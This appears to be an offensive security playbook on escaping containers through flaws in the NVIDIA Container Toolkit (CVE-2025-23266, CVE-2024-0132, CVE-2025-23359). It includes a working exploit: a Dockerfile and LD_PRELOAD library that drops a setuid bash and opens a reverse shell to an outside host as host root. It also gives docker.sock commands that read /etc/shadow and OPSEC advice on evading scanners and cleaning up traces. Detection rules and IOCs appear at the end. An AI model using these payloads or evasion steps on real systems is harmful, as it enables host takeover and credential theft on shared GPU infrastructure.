# NVIDIA Container Toolkit GPU Escapes

ATT&CK: T1611 (Escape to Host), T1610 (Deploy Container — via malicious image) · CWE-426 (Untrusted
Search Path / `LD_PRELOAD`), CWE-367 (TOCTOU), CWE-668 (Exposure to Wrong Sphere).

The NVIDIA Container Toolkit (NCT, `nvidia-container-toolkit` / `libnvidia-container`) injects GPU
access into containers via OCI hooks that run **on the host as root**. Because the hooks touch the
container's filesystem and (in the bug) inherit its environment, a malicious image can run code in the
privileged hook process — a clean escape with no kernel bug and no privileged flag. NCT backs most
managed AI/GPU clouds, so these are systemic multi-tenant risks. Requires only the ability to **run a
container from an attacker-chosen image** on a vulnerable GPU node.

## 1. NVIDIAScape — CVE-2025-23266 (LD_PRELOAD OCI-hook inheritance)

### Mechanism
The `enable-cuda-compat` (`nvidia-ctk ... createContainer`) hook runs **on the host as root** but
inherits environment variables from the container image — including `LD_PRELOAD`. The hook's working
directory is the **container's** filesystem, so `LD_PRELOAD=/proc/self/cwd/poc.so` makes the privileged
host hook process load the attacker's library from inside the container → arbitrary code as host root.
Three-line Dockerfile, CVSS 9.0.

- Affected: NCT `<= 1.17.7` (CDI mode `< 1.17.5`); NVIDIA GPU Operator `<= 25.3.0`.
- Fixed: NCT 1.17.8 / GPU Operator 25.3.1 (the `createContainer` hook now has an explicit `env` block
  so attacker env no longer leaks in). Reported at Pwn2Own Berlin (May 2025), disclosed Jul 2025.

### Working exploit
`scripts/nvidiascape_build.sh --cmd '<cmd>'` builds and (optionally) runs this. The image:
```dockerfile
FROM busybox
ENV LD_PRELOAD=/proc/self/cwd/poc.so
ADD poc.so /poc.so
```
`poc.so` (constructor fires when the privileged hook loads it on the host):
```c
/* gcc -shared -fPIC -o poc.so poc.c   (no libs needed) */
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor))
void escape(void) {
    /* runs as ROOT in the HOST mount namespace via the nvidia createContainer hook */
    setuid(0); setgid(0);
    system("id > /escape_proof 2>&1; "
           "cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; "
           "nohup bash -c 'bash -i >& /dev/tcp/10.0.0.9/443 0>&1' >/dev/null 2>&1 &");
}
```
Run it on the GPU node (the `--gpus`/`--runtime=nvidia` path invokes the vulnerable hook):
```bash
docker run --rm --runtime=nvidia --gpus all evil-gpu:latest true
# or in K8s, schedule a pod requesting nvidia.com/gpu on a vulnerable node.
```
The image needs no GPU at runtime — merely scheduling through the NVIDIA runtime fires the hook.

## 2. CVE-2024-0132 + bypass CVE-2025-23359 — TOCTOU mount escape

### Mechanism
A time-of-check/time-of-use race in NCT's default (non-CDI) mode: a crafted image manipulates a path
between NCT's check and its mount, so NCT bind-mounts attacker-chosen **host** paths into the container.
With the host filesystem mounted you reach `docker.sock`/`containerd.sock` and get root on the host even
from initially read-only access (Unix socket write semantics). CVSS 9.0. Wiz: ~33% of cloud environments
exposed.

- Affected: NCT `<= 1.16.1`, GPU Operator `<= 24.6.1`. Fixed 1.16.2 / 24.6.2.
- CVE-2025-23359 (CVSS 9.0, fixed 1.17.4): NVIDIA's first patch was **incomplete** — a bypass of
  CVE-2024-0132 (plus a Docker-on-Linux mount-table-exhaustion DoS via `bind-propagation=shared`).
- Not affected: **CDI mode** (Container Device Interface). Migrating to CDI is the structural mitigation.

### Exploitation shape
A malicious image whose mount-source path is swapped (symlink/dir race) during NCT setup so the host
root or a host socket lands inside the container; then:
```bash
# after the TOCTOU win, host / is reachable inside the container (e.g. at /host or via the mounted sock)
ls -la /host/var/run/docker.sock || true
docker -H unix:///host/var/run/docker.sock run -v /:/h --privileged --rm alpine \
   chroot /h sh -c 'id; cat /etc/shadow'
```
The race is environment-specific; `scripts/nvidiascape_build.sh --check` reports NCT/GPU-Operator
versions on the node so you know which CVE applies before attempting.

## Detection

**Falco — privileged hook loading a library from a container path / NVIDIAScape ENV:**
```yaml
- rule: NVIDIA Hook Loads Library From Container Filesystem (NVIDIAScape)
  desc: nvidia-container/createContainer hook dlopen of a .so under a container/proc-cwd path
  condition: >
    spawned_process and
    (proc.name in (nvidia-container-runtime-hook, nvidia-ctk, nvidia-container-cli)) and
    (proc.env contains "LD_PRELOAD" or proc.aname[1] contains "createContainer")
  output: "NVIDIAScape escape attempt (proc=%proc.name env=%proc.env cmd=%proc.cmdline)"
  priority: CRITICAL
  tags: [container, T1611]
```
**Image scanning (best preventive signal for CVE-2025-23266):** flag images that set
`LD_PRELOAD=/proc/self/cwd/*` or `LD_PRELOAD` to any in-image path; treat as malicious. **Version
inventory:** alert on NCT `<= 1.17.7` (23266), `<= 1.16.1`/`< 1.17.4` (0132/23359), GPU Operator
`<= 25.3.0`. **Mount-table monitoring:** unbounded growth of `/proc/<pid>/mountinfo` entries after
container exit indicates the 23359 DoS/bypass. **IOCs:** `LD_PRELOAD` in an image's `ENV`; `nvidia-ctk`
spawning `sh`/`bash`/`system()`; setuid bash dropped right after a GPU container starts; host-path
mounts appearing in a GPU container.

## OPSEC

- NVIDIAScape needs only an image push + a normal GPU run — no privileged flag, no kernel bug — so it
  blends into legitimate GPU scheduling. The loud part is the payload (revshell / setuid bash) running
  as host root; keep it minimal and clean up `/escape_proof`, `/tmp/rootbash`, and the `poc.so`.
- The `LD_PRELOAD` ENV is plainly visible to any image scanner (Trivy/Grype/registry admission) — if
  the target enforces image scanning on push, this is detected before run. Consider setting it at
  runtime only where you control the manifest, but note the hook still reads container env.
- TOCTOU (0132/23359) is a race; failed attempts may leave orphaned mounts and can trigger the
  mount-table-exhaustion DoS — avoid hammering it on production GPU nodes.
- Cleanup: remove dropped host artifacts and any helper container started via a mounted socket; you
  cannot retract host kernel-audit/Falco events generated by the hook.

## References

- Wiz Research, "NVIDIAScape — NVIDIA AI Vulnerability (CVE-2025-23266)" (Jul 2025).
- NVIDIA Security Bulletin for CVE-2025-23266; The Hacker News / Kodem / ZeroPath write-ups + PoC.
- Wiz, "NVIDIA AI Container Toolkit CVE-2024-0132"; NVIDIA/libnvidia-container GHSA-q2v4-jw5g-9xxj.
- Trend Micro, "Incomplete NVIDIA Patch to CVE-2024-0132 Exposes AI Infrastructure" (CVE-2025-23359, Apr 2025).
